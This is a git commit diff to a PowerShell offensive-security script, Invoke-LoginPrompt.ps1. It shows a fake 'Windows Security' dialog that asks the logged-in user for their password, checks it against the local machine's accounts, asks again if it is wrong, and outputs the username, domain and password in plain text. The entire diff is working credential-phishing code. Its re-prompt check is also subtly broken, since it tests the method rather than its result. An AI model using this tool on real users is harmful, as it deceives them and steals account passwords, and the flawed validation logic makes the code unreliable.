ac95061aa7249d1f7e4f58c96a528665945bc841
enigma0x3 <matthew@webnelson.net>
2015-01-22 11:55:23 -0500

    Update Invoke-LoginPrompt.ps1

--- Invoke-LoginPrompt.ps1
+++ Invoke-LoginPrompt.ps1
@@ -2,8 +2,24 @@
 #Twitter: @enigma0x3
 #Blog: www.enigma0x3.wordpress.com
 
-function Invoke-LoginPrompt{
 $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
-$newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
-$newcred
-}
+$username = "$env:username"
+$domain = "$env:userdomain"
+$full = "$domain" + "\" + "$username"
+$password = $cred.GetNetworkCredential().password
+Add-Type -assemblyname System.DirectoryServices.AccountManagement
+$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
+$DS.ValidateCredentials("$full", "$password") | out-null
+if($DS.ValidateCredentials -ne "True"){
+    $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
+    $username = "$env:username"
+    $domain = "$env:userdomain"
+    $full = "$domain" + "\" + "$username"
+    $password = $cred.GetNetworkCredential().password
+    Add-Type -assemblyname System.DirectoryServices.AccountManagement
+    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
+    $DS.ValidateCredentials("$full", "$password") | out-null
+    }
+ 
+ $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
+ $output
